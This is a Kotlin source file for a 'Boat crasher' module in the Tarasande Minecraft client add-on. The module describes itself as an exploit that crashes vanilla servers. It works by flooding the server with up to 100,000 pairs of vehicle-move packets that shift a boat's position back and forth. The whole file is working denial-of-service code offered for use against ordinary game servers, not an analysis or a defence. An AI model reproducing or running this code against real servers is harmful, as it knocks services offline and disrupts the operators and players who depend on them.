package de.florianmichael.tarasande_crasher.module

import de.florianmichael.tarasande_crasher.errorMessage
import de.florianmichael.tarasande_crasher.forcePacket
import net.minecraft.entity.vehicle.BoatEntity
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket
import net.tarasandedevelopment.tarasande.event.EventDisconnect
import net.tarasandedevelopment.tarasande.event.EventUpdate
import net.tarasandedevelopment.tarasande.mc
import net.tarasandedevelopment.tarasande.system.base.valuesystem.impl.ValueNumber
import net.tarasandedevelopment.tarasande.system.feature.modulesystem.Module

class ModuleBoatCrasher : Module("Boat crasher", "Weird exploit that crashes vanilla servers", "Crasher") {

    private val repeat = ValueNumber(this, "Repeat", 1000.0, 100000.0, 100000.0, 1000.0)

    private val offsetX = ValueNumber(this, "Offset x", 1.0, 3.0, 5.0, 1.0)
    private val offsetY = ValueNumber(this, "Offset y", 1.0, 3.0, 5.0, 1.0)
    private val offsetZ = ValueNumber(this, "Offset z", 1.0, 3.0, 5.0, 1.0)

    init {
        registerEvent(EventDisconnect::class.java) {
            switchState()
        }
        registerEvent(EventUpdate::class.java) {
            if (it.state == EventUpdate.State.POST) {
                if (mc.player!!.vehicle == null && mc.player!!.vehicle !is BoatEntity && enabled.value) {
                    errorMessage("You dismounted the boat, disabled $name")
                    switchState()
                }
            }
        }
    }

    override fun onEnable() {
        if (mc.player == null) {
            switchState()
            return
        }
        if (mc.player!!.vehicle != null && mc.player!!.vehicle is BoatEntity) {
            for (i in 0 until repeat.value.toInt()) {
                val vehiclePos = mc.player!!.vehicle!!.pos // track prev pos

                // spam to random values
                mc.player!!.vehicle!!.setPos(vehiclePos.x - offsetX.value.toInt(), vehiclePos.y - offsetY.value.toInt(), vehiclePos.z - offsetZ.value.toInt())
                forcePacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))

                // reset values
                mc.player!!.vehicle!!.setPos(vehiclePos.x, vehiclePos.y, vehiclePos.z)
                forcePacket(VehicleMoveC2SPacket(mc.player!!.vehicle!!))
            }
        } else {
            errorMessage("You need to be in a boat to use this")
            switchState()
        }
    }
}
